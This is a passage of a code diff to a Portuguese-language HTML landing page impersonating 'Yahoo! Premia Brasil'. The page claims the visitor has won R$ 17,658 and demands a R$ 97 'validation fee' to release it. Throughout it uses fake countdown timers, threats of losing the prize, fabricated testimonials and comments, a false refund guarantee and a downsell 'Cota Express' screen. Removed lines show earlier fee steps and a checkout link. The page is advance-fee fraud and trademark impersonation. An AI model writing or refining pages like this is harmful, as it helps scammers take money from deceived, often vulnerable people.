+      font-size: 24px;
+      font-weight: 900;
+      line-height: 1.25;
+    }
+
+    .downsell-header h1 span {
+      color: #eab308;
+    }
+
+    .downsell-header p {
+      font-size: 12.5px;
+      color: #cbd5e1;
+      margin-top: 8px;
+      line-height: 1.45;
+    }
+
+    .downsell-timer-card {
+      background: #0f172a;
+      border: 1px solid #ca8a04;
+      border-radius: 18px;
+      padding: 16px;
+      text-align: center;
+    }
+
+    .downsell-timer-card .label {
+      font-size: 11px;
+      font-weight: 800;
+      color: #eab308;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+
+    .downsell-timer-card .clock {
+      font-size: 38px;
+      font-weight: 900;
+      color: #eab308;
+      line-height: 1.1;
+      margin: 4px 0;
+    }
+
+    .downsell-timer-card .sub {
+      font-size: 10.5px;
+      color: #94a3b8;
+    }
+
+    .downsell-main-box {
+      background: #0f172a;
+      border: 1.5px solid #1e293b;
+      border-radius: 20px;
+      padding: 20px 16px;
+      position: relative;
+    }
+
+    .downsell-corner-tag {
+      position: absolute;
+      top: -11px;
+      right: 16px;
+      background: #10b981;
+      color: #ffffff;
+      padding: 4px 10px;
+      border-radius: 999px;
+      font-size: 9.5px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+
+    .downsell-desc-box {
+      background: #1e293b;
+      border-radius: 14px;
+      padding: 14px;
+      font-size: 12px;
+      color: #cbd5e1;
+      line-height: 1.5;
+      margin-bottom: 14px;
+    }
+
+    .downsell-desc-box strong {
+      color: #ffffff;
+    }
+
+    .cota-row {
+      border-radius: 12px;
+      padding: 12px 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+
+    .cota-row.expired {
+      background: rgba(239, 68, 68, 0.08);
+      border: 1px dashed rgba(239, 68, 68, 0.35);
+      color: #94a3b8;
+    }
+
+    .cota-row.expired .price {
+      text-decoration: line-through;
+      color: #64748b;
+      font-weight: 800;
+      font-size: 15px;
+    }
+
+    .cota-row.active {
+      background: rgba(16, 185, 129, 0.12);
+      border: 1px solid #10b981;
+      color: #10b981;
+    }
+
+    .cota-row.active .price {
+      color: #ffffff;
+      font-weight: 900;
+      font-size: 18px;
+    }
+
+    .downsell-price-highlight {
+      text-align: center;
+      margin: 18px 0 14px;
+    }
+
+    .downsell-price-highlight .old {
+      font-size: 11px;
+      color: #64748b;
+      text-decoration: line-through;
+    }
+
+    .downsell-price-highlight .label {
+      font-size: 11.5px;
+      font-weight: 800;
+      color: #10b981;
+      text-transform: uppercase;
+    }
+
+    .downsell-price-highlight .val {
+      font-size: 38px;
+      font-weight: 900;
+      color: #ffffff;
+      line-height: 1;
+    }
+
+    .downsell-price-highlight .val span {
+      font-size: 20px;
+      color: #eab308;
+    }
+
+    .downsell-price-highlight .info {
+      font-size: 11px;
+      color: #94a3b8;
+      margin-top: 4px;
+    }
+
+    .downsell-footer-badges {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      font-size: 10.5px;
+      color: #64748b;
+      margin-top: 10px;
+    }
+
+    /* Footer */
+    footer {
+      text-align: center;
+      font-size: 10px;
+      color: #94a3b8;
+      line-height: 1.5;
+      padding: 10px 0 15px;
     }
   </style>
 </head>
 <body>
 
-  <!-- Main Container -->
-  <main class="page-wrapper">
+  <!-- ==================== PÁGINA PRINCIPAL ==================== -->
+  <div class="container" id="mainContainer">
 
-    <!-- 1. Top Status Card -->
-    <section class="status-card" aria-label="Status de Liberação">
-      <div class="status-header">
-        <span>STATUS DE LIBERAÇÃO <span class="step-highlight">ETAPA 2 DE 7</span></span>
-        <span class="status-badge">
-          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="20 6 9 17 4 12"></polyline>
-          </svg>
-          1 Concluída
-        </span>
-      </div>
-
-      <div class="progress-bar-track">
-        <div class="progress-bar-fill"></div>
-      </div>
-
-      <div class="status-footer">
-        Faltam: 5 etapas
-      </div>
-    </section>
-
-    <!-- 2. Taxa de Cadastro Paga Pill -->
-    <div class="taxa-paga-pill">
-      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
-        <polyline points="20 6 9 17 4 12"></polyline>
-      </svg>
-      TAXA DE CADASTRO PAGA (R$ 90)
+    <!-- Top Badge -->
+    <div class="top-badge">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+      Saque Yahoo! Premia Liberado
     </div>
 
-    <!-- 3. Headline & Description -->
-    <header class="main-hero-text">
-      <h1 class="main-title">
-        Seu saque de <span class="amount-highlight">R$ 17.658,00</span> está na fila de espera.
-      </h1>
-      <p class="main-description">
-        Você pagou a taxa inicial com sucesso. No entanto, por causa da alta demanda do <strong>Yahoo! Premia</strong>, o prazo normal de envio gratuito é de <span class="danger-highlight">24 dias úteis</span>.
-      </p>
-    </header>
-
-    <!-- 4. Warning Card (Risco de Cancelamento) -->
-    <section class="warning-card">
-      <div class="warning-title">
-        <span>⚠️</span> RISCO DE CANCELAMENTO
-      </div>
-      <p class="warning-text">
-        Aguardar 24 dias expõe seu saldo a bugs de sistema e cancelamento automático. Se fechar a página agora, você perderá os R$ 90,00 que acabou de pagar e o saldo voltará para o Yahoo! Premia.
-      </p>
-    </section>
-
-    <!-- 5. Expiration Countdown Pill -->
-    <div class="expire-timer-pill">
-      <span>⏰</span>
-      <span>SEU SALDO EXPIRA EM:</span>
-      <strong class="timer-clock" id="countdownClock">08:54</strong>
+    <!-- Header Text -->
+    <div class="header-text">
+      <h1>Seu saque de <span>R$ 17.658</span> do Yahoo! Premia pode ser liberado ainda hoje</h1>
+      <p>O sistema já processou os seus ganhos. O saldo de <strong>R$ 17.658,00</strong> está <strong>reservado na central</strong>, aguardando apenas a sua validação final para ser enviado.</p>
     </div>
 
-    <!-- 6. Offer Card (Acelerador de Saque) -->
-    <section class="offer-card">
-      <div class="floating-recommend-badge">RECOMENDADO</div>
+    <!-- Timer Box -->
+    <div class="timer-pill">
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+      Tempo limite de liberação: <strong id="topTimer">09:51</strong>
+    </div>
 
-      <div class="offer-header-group">
-        <div class="thunder-icon-box">
-          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-            <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
-          </svg>
-        </div>
-        <div class="offer-header-info">
-          <span class="offer-tag-vip">SERVIDOR VIP</span>
-          <h2 class="offer-title">Acelerador de Saque Imediato (PIX)</h2>
-        </div>
+    <!-- Trust Chips -->
+    <div class="trust-chips">
+      <div class="chip">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        100% Seguro
       </div>
-
-      <!-- Benefit Highlight -->
-      <div class="benefit-highlight-box">
-        <div class="benefit-title">
-          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
-            <polyline points="20 6 9 17 4 12"></polyline>
-          </svg>
-          Transferência em 3 Minutos
-        </div>
-        <p class="benefit-desc">
-          Pule a fila de 24 dias e receba o dinheiro instantaneamente.
-        </p>
+      <div class="chip">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#2563eb" stroke-width="2.5"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+        PIX em minutos
       </div>
-
-      <!-- Price Section -->
-      <div class="price-callout-wrap">
-        <div class="price-callout-label">CUSTO DO ACELERADOR:</div>
-        <div class="price-callout-value">R$ 47,00</div>
+      <div class="chip">
+        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        Dados protegidos
       </div>
+    </div>
 
-      <!-- CTA Button -->
-      <a href="https://go.perfectpay.com.br/PPU38CQGM1E?upsell=true" class="btn-checkout-cta" id="ctaButton">
-        <span>PAGAR R$ 47 E SACAR AGORA</span>
-        <span>→</span>
-      </a>
-    </section>
+    <!-- Alert Card -->
+    <div class="card card-border-red">
+      <h3 class="card-title">Atenção: Ação Obrigatória</h3>
+      <p style="font-size: 12px; color: #475569; line-height: 1.4;">
+        Esse valor só será liberado se você <strong>confirmar ainda hoje</strong>. Se não validar dentro do prazo, o sistema automaticamente:
+      </p>
+      <ul class="warning-list">
+        <li>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+          Bloqueia o saque sorteado pelo Yahoo! Premia Brasil
+        </li>
+        <li>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+          Devolve os R$ 17.658,00 ao fundo dos próximos sorteios
+        </li>
+        <li>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+          Encerra sua prioridade de acesso na campanha
+        </li>
+        <li>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="#ef4444" stroke="#ffffff" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
+          Impede qualquer liberação posterior do valor
+        </li>
+      </ul>
+    </div>
 
-    <!-- 7. Resumo da Transação -->
-    <section class="summary-card">
-      <h3 class="summary-title">RESUMO DA TRANSAÇÃO</h3>
+    <!-- Purple Explanation Card -->
+    <div class="purple-card">
+      <div class="purple-badge">Certificação de Ganhos</div>
+      <h2>De onde vem este valor de R$ 17.658?</h2>
+      <p>
+        O <strong>Yahoo! Premia</strong> repassa aos usuários contemplados os valores das campanhas semanais. O saldo já foi processado no seu nome e a legislação exige que <strong>100% deste montante</strong> seja repassado para si. O dinheiro não é aleatório, é <strong>resultado</strong>.
+      </p>
+    </div>
 
-      <div class="summary-list">
-        <div class="summary-row">
-          <span>Saldo Acumulado</span>
-          <span class="summary-row-val">R$ 17.658,00</span>
-        </div>
-
-        <div class="summary-row">
-          <span>Taxa de Cadastro</span>
-          <span class="badge-paid-green">PAGO R$ 90,00</span>
-        </div>
-
-        <div class="summary-row">
-          <span class="summary-row-label">
-            <span>⏰</span> Acelerador PIX
-          </span>
-          <span class="summary-row-val">R$ 47,00</span>
-        </div>
-      </div>
-
-      <div class="summary-divider"></div>
-
-      <div class="summary-total-row">
-        <span class="summary-total-label">Valor líquido a receber:</span>
-        <span class="summary-total-val">R$ 17.658,00</span>
-      </div>
-    </section>
-
-    <!-- 8. Comentários (18) -->
-    <section class="comments-wrapper">
-      <h3 class="comments-section-title">Comentários (18)</h3>
-
-      <!-- Comment 1 -->
-      <article class="comment-card">
-        <div class="comment-header">
-          <img 
-            class="comment-avatar" 
-            src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=100&auto=format&fit=crop&q=80" 
-            alt="Fernanda Oliveira"
-            loading="lazy"
-          >
-          <div class="comment-author-info">
-            <h4>Fernanda Oliveira</h4>
-            <span>Há 2 min</span>
+    <!-- Guarantee List Card -->
+    <div class="card">
+      <h3 class="card-title" style="margin-bottom: 14px;">Ao confirmar agora, você garante:</h3>
+      <div class="features-list">
+        <div class="feature-item">
+          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
+          <div>
+            <h3>Saque Integral (R$ 17.658,00)</h3>
+            <p>Transferido direto para sua chave PIX, sem deduções.</p>
           </div>
         </div>
-        <p class="comment-body">
-          Eu paguei os 90 e depois achei que era golpe quando pediu esses 47 do acelerador. Mas paguei com medo... GENTE CAIU NA HORA! R$ 17 mil na minha conta!! Valeu muito a pena.
-        </p>
-        <div class="comment-actions">
-          <button type="button" class="comment-action-btn">Curtir</button>
-          <button type="button" class="comment-action-btn">Responder</button>
-          <span class="comment-like-badge">❤️ 45</span>
-        </div>
-      </article>
-
-      <!-- Comment 2 -->
-      <article class="comment-card">
-        <div class="comment-header">
-          <img 
-            class="comment-avatar" 
-            src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&auto=format&fit=crop&q=80" 
-            alt="Carlos Henrique"
-            loading="lazy"
-          >
-          <div class="comment-author-info">
-            <h4>Carlos Henrique</h4>
-            <span>Há 15 min</span>
+        <div class="feature-item">
+          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
+          <div>
+            <h3>Participação VIP nos próximos sorteios</h3>
+            <p>Sua conta segue ativa nos sorteios semanais.</p>
           </div>
         </div>
-        <p class="comment-body">
-          Não fechem a página!!! Eu fechei de teimoso e perdi a taxa de cadastro pq o sistema cancelou. Tive que fazer tudo de novo. Paguem o acelerador que cai no mesmo segundo.
-        </p>
-        <div class="comment-actions">
-          <button type="button" class="comment-action-btn">Curtir</button>
-          <button type="button" class="comment-action-btn">Responder</button>
+        <div class="feature-item">
+          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
+          <div>
+            <h3>Grupo VIP dos Contemplados</h3>
+            <p>Acesso ao grupo exclusivo dos sorteados desta temporada.</p>
+          </div>
         </div>
-      </article>
-    </section>
+        <div class="feature-item">
+          <svg class="icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg>
+          <div>
+            <h3>Suporte oficial direto</h3>
+            <p>Atendimento prioritário da equipe oficial.</p>
+          </div>
+        </div>
+      </div>
+    </div>
 
-    <!-- 9. Aviso Legal e Termos de Uso -->
-    <footer class="legal-disclaimer">
-      <strong>AVISO LEGAL E TERMOS DE USO:</strong> O Yahoo! Premia é um produto educacional e de acesso a um curso em vídeo aulas. Os valores, exemplos e depoimentos apresentados nesta página têm caráter estritamente ilustrativo e representam uma projeção matemática baseada no potencial máximo de resolução de dados, não configurando uma promessa, garantia de ganho exato ou direito adquirido. O acesso à plataforma é concedido mediante o pagamento da taxa de adesão descrita no checkout...
+    <!-- Steps Card -->
+    <div class="card">
+      <h3 class="section-headline">Passo a passo para liberar o seu saque:</h3>
+      <div class="steps-list">
+        <div class="step-box">
+          <div class="step-num">1</div>
+          <div class="step-content">
+            <h4>Aperte no Botão Verde</h4>
+            <p>Inicie o processo rolando a tela para baixo e clicando em "Pagar R$ 97 e Sacar".</p>
+          </div>
+        </div>
+        <div class="step-box">
+          <div class="step-num">2</div>
+          <div class="step-content">
+            <h4>Cadastre sua Chave PIX</h4>
+            <p>Informe exatamente a chave para onde o sistema deve transferir o dinheiro.</p>
+          </div>
+        </div>
+        <div class="step-box">
+          <div class="step-num">3</div>
+          <div class="step-content">
+            <h4>Efetue o Pagamento de Segurança</h4>
+            <p>Preencha seus dados de pagamento no checkout e pague a taxa única antifraude.</p>
+          </div>
+        </div>
+        <div class="step-box">
+          <div class="step-num">4</div>
+          <div class="step-content">
+            <h4>Saldo Cai na Conta</h4>
+            <p>Após a confirmação da taxa, os R$ 17.658 são depositados automaticamente no seu banco.</p>
+          </div>
+        </div>
+      </div>
+      <div class="note-box">
+        <strong>Atenção:</strong> Apenas gerar a chave PIX e não efetuar o pagamento da taxa não lhe dá direito ao saldo. A liberação ocorre estritamente após a baixa do pagamento.
+      </div>
+    </div>
+
+    <!-- Payment / Checkout Card -->
+    <div class="pay-card">
+      <div class="receipt-header">Extrato de Liberação</div>
+      <div class="receipt-line">
+        <span>Saldo a Transferir</span>
+        <strong style="color: #ca8a04;">R$ 17.658,00</strong>
+      </div>
+      <div class="receipt-line">
+        <span>Taxa de Validação de Dados</span>
+        <strong style="color: #dc2626;">- R$ 97,00</strong>
+      </div>
+
+      <p style="font-size: 11.5px; color: #64748b; margin-top: 14px;">
+        Para que o sistema libere o seu PIX gigante de <strong>R$ 17.658,00</strong>, o gateway exige o pagamento da taxa de validação no valor de:
+      </p>
+
+      <div class="highlight-price">R$ 97,00</div>
+
+      <button class="btn-green open-pix-btn" type="button">
+        <!-- Ícone de Carteira (Wallet) -->
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5z"/>
+          <path d="M16 12h5a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1h-5a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2z"/>
+          <circle cx="18.5" cy="10" r="0.9" fill="currentColor"/>
+        </svg>
+        <span>Pagar R$ 97 e Sacar R$ 17.658 Agora</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="9 18 15 12 9 6"/></svg>
+      </button>
+
+      <div class="btn-sub">
+        <span>● PIX</span>
+        <span>🛡 Gateway Seguro</span>
+      </div>
+    </div>
+
+    <!-- Guarantee Box -->
+    <div class="card">
+      <h3 class="card-title">Garantia de Devolução Rápida</h3>
+      <p style="font-size: 12px; color: #475569; line-height: 1.4;">
+        Se o seu PIX de <strong>R$ 17.658</strong> não cair na conta em até <strong>3 minutos</strong> após o pagamento, a taxa de <strong>R$ 97</strong> é devolvida automaticamente para você, sem perguntas.
+      </p>
+      <div class="status-alert">
+        <div class="green-dot"></div>
+        <div><strong>+18.547 contemplados nesta semana</strong><br><span style="color: #64748b;">já confirmaram e receberam seus prêmios · ao vivo</span></div>
+      </div>
+    </div>
+
+    <!-- Testimonials -->
+    <div class="card">
+      <div style="text-align: center; margin-bottom: 12px;">
+        <span style="font-size: 10px; font-weight: 700; color: #16a34a; text-transform: uppercase;">Quem já confirmou, recomenda</span>
+        <h3 class="card-title" style="margin-top: 4px;">Histórias Reais de Quem Foi Sorteado</h3>
+      </div>
+
+      <!-- User 1 -->
+      <div class="testimonial">
+        <div class="testimonial-user">
+          <img class="avatar" src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=120&auto=format&fit=crop&q=80" alt="Ana Beatriz">
+          <div class="testimonial-meta">
+            <h5>Ana Beatriz</h5>
+            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 2 min</span></div>
+          </div>
+        </div>
+        <p class="testimonial-text">Achei que era brincadeira, mas resolvi confirmar. Em poucos minutos a notificação do banco apareceu com os R$ 17.658,00! 🙏🥳</p>
+      </div>
+
+      <!-- User 2 -->
+      <div class="testimonial">
+        <div class="testimonial-user">
+          <img class="avatar" src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=120&auto=format&fit=crop&q=80" alt="Rafael Torres">
+          <div class="testimonial-meta">
+            <h5>Rafael Torres</h5>
+            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 5 min</span></div>
+          </div>
+        </div>
+        <p class="testimonial-text">Recebi a mensagem dos sorteios semanais e fui contemplado essa semana. Confirmei meus dados e o Nubank apitou com o PIX!!!</p>
+      </div>
+
+      <!-- User 3 -->
+      <div class="testimonial">
+        <div class="testimonial-user">
+          <img class="avatar" src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=120&auto=format&fit=crop&q=80" alt="Marcos Silva">
+          <div class="testimonial-meta">
+            <h5>Marcos Silva</h5>
+            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 12 min</span></div>
+          </div>
+        </div>
+        <p class="testimonial-text">Sistema confiável. Validei a chave PIX e o desbloqueio foi automático. Vale demais ser contemplado.</p>
+      </div>
+
+      <!-- User 4 -->
+      <div class="testimonial">
+        <div class="testimonial-user">
+          <img class="avatar" src="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=120&auto=format&fit=crop&q=80" alt="Simone Albuquerque">
+          <div class="testimonial-meta">
+            <h5>Simone Albuquerque</h5>
+            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 18 min</span></div>
+          </div>
+        </div>
+        <p class="testimonial-text">Já caí em muito golpe, mas a garantia me deu segurança. Saque liberado direto na chave do meu CPF.</p>
+      </div>
+
+      <!-- User 5 -->
+      <div class="testimonial">
+        <div class="testimonial-user">
+          <img class="avatar" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120&auto=format&fit=crop&q=80" alt="Juliana Mendes">
+          <div class="testimonial-meta">
+            <h5>Juliana Mendes</h5>
+            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 25 min</span></div>
+          </div>
+        </div>
+        <p class="testimonial-text">Tava tremendo, mas 2 minutos depois a Caixa avisou da transferência. Gratidão por participar!</p>
+      </div>
+
+      <!-- User 6 -->
+      <div class="testimonial">
+        <div class="testimonial-user">
+          <img class="avatar" src="https://images.unsplash.com/photo-1522075469751-3a6694fb2f61?w=120&auto=format&fit=crop&q=80" alt="Fernando Costa">
+          <div class="testimonial-meta">
+            <h5>Fernando Costa</h5>
+            <div class="stars">★★★★★ <span style="color: #94a3b8;">· Há 33 min</span></div>
+          </div>
+        </div>
+        <p class="testimonial-text">Confirmei agora! Vou poder quitar o carro. Obrigado Yahoo! Premia Brasil.</p>
+      </div>
+    </div>
+
+    <!-- FAQ Retrátil -->
+    <div style="text-align: center; margin-top: 8px;">
+      <span style="font-size: 11px; font-weight: 700; color: #16a34a; letter-spacing: 0.5px; text-transform: uppercase;">Dúvidas Frequentes</span>
+      <h3 style="font-size: 22px; font-weight: 900; color: #0f172a; margin-top: 4px; display: flex; align-items: center; justify-content: center; gap: 8px;">
+        <span style="color: #ec4899;">❓</span> FAQ
+      </h3>
+    </div>
+
+    <div class="faq-container">
+      
+      <!-- FAQ 1 (Aberto por padrão) -->
+      <div class="faq-item active">
+        <button class="faq-header" type="button" aria-expanded="true">
+          <span>1. Como sei que fui realmente sorteado(a)?</span>
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </button>
+        <div class="faq-body" style="max-height: 180px;">
+          <div class="faq-content">
+            Seu e-mail foi selecionado entre milhares de contas Yahoo ativas no Brasil nesta semana. Ao confirmar seus dados, validamos que a participação corresponde ao e-mail contemplado.
+          </div>
+        </div>
+      </div>
+
+      <!-- FAQ 2 -->
+      <div class="faq-item">
+        <button class="faq-header" type="button" aria-expanded="false">
+          <span>2. É seguro informar meus dados aqui?</span>
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </button>
+        <div class="faq-body">
+          <div class="faq-content">
+            Sim. A página opera com conexão criptografada de ponta a ponta (256-bit) e seus dados são usados apenas para validar o sorteio e liberar o PIX na sua chave.
+          </div>
+        </div>
+      </div>
+
+      <!-- FAQ 3 -->
+      <div class="faq-item">
+        <button class="faq-header" type="button" aria-expanded="false">
+          <span>3. Quanto tempo o PIX leva para cair?</span>
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </button>
+        <div class="faq-body">
+          <div class="faq-content">
+            Após a confirmação dos dados e o cadastro da chave PIX, o envio é automatizado e o valor cai em média entre 5 e 10 minutos.
+          </div>
+        </div>
+      </div>
+
+      <!-- FAQ 4 -->
+      <div class="faq-item">
+        <button class="faq-header" type="button" aria-expanded="false">
+          <span>4. Os sorteios são semanais?</span>
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </button>
+        <div class="faq-body">
+          <div class="faq-content">
+            Sim. Toda semana selecionamos contemplados entre milhares de contas Yahoo ativas no Brasil.
+          </div>
+        </div>
+      </div>
+
+      <!-- FAQ 5 -->
+      <div class="faq-item">
+        <button class="faq-header" type="button" aria-expanded="false">
+          <span>5. Posso confirmar pelo celular?</span>
+          <svg class="faq-chevron" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="6 9 12 15 18 9"/>
+          </svg>
+        </button>
+        <div class="faq-body">
+          <div class="faq-content">
+            Sim. A confirmação funciona em qualquer dispositivo, sem instalar nada.
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Card Inferior com Logo Oficial Yahoo! -->
+    <div class="card" style="text-align: center; padding: 24px 18px;">
+      
+      <div class="yahoo-logo-container">
+        <img 
+          class="yahoo-img" 
+          src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/1280px-Yahoo%21_%282019%29.svg.png" 
+          alt="Yahoo!"
+          loading="lazy"
+          onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/3/3a/Yahoo%21_%282019%29.svg';"
+        >
+      </div>
+
+      <div class="pill-red">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        Tempo restante: <span id="bottomTimer">09:51</span>
+      </div>
+
+      <p style="font-size: 11.5px; color: #475569; line-height: 1.4; margin-bottom: 12px;">
+        Se você sair desta página sem confirmar, o Yahoo! vai devolver o valor ao fundo interno e encerrar sua prioridade de saque.
+      </p>
+
+      <h3 style="font-size: 16px; font-weight: 900; color: #0f172a; margin-bottom: 6px;">
+        O SALDO JÁ ESTÁ NO YAHOO!
+      </h3>
+
+      <p style="font-size: 11.5px; color: #64748b; margin-bottom: 16px;">
+        Ele já foi acumulado. Ele já está no seu nome. Agora só falta você liberar o saque.
+      </p>
+
+      <!-- Botão com ícone de Carteira -->
+      <button class="btn-green open-pix-btn" type="button">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12V7a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-5z"/>
+          <path d="M16 12h5a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1h-5a2 2 0 0 0-2 2v0a2 2 0 0 0 2 2z"/>
+          <circle cx="18.5" cy="10" r="0.9" fill="currentColor"/>
+        </svg>
+        <span>LIBERAR MEU SAQUE DE R$17.658 AGORA</span>
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="9 18 15 12 9 6"/></svg>
+      </button>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+      © Yahoo! Premia Brasil · premiacoes@yahoo.com · Campanha promocional · Termos aplicáveis
     </footer>
 
-  </main>
+  </div>
+
+  <!-- ==================== PÁGINA DOWNSELL ==================== -->
+  <div class="downsell-screen" id="downsellContainer">
+    
+    <div class="downsell-top-badge">
+      ⚠️ RECLASSIFICAÇÃO BANCÁRIA · COTA EXPRESS ATIVADA
+    </div>
+
+    <!-- Logo Yahoo no Downsell -->
+    <div style="display: flex; justify-content: center; margin: 4px 0;">
+      <img 
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/1280px-Yahoo%21_%282019%29.svg.png" 
+        alt="Yahoo!" 
+        style="height: 32px; filter: brightness(0) invert(1);"
+      >
+    </div>
+
+    <div class="downsell-header">
+      <h1>Sua Cota foi ajustada para <span>R$ 8.420,00</span></h1>
+      <p>A vaga do prêmio máximo foi repassada. Seu cadastro foi realocado para a <strong>Cota Express</strong> com taxa proporcional reduzida.</p>
+    </div>
+
+    <div class="downsell-timer-card">
+      <div class="label">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        TEMPO RESTANTE PARA VALIDAR A COTA EXPRESS:
+      </div>
+      <div class="clock" id="downsellTimer">01:00</div>
+      <div class="sub">Após esse prazo, a chave PIX é desvinculada definitivamente de qualquer bonificação.</div>
+    </div>
+
+    <div class="downsell-main-box">
+      <div class="downsell-corner-tag">COTA DISPONÍVEL</div>
+
+      <div class="downsell-desc-box">
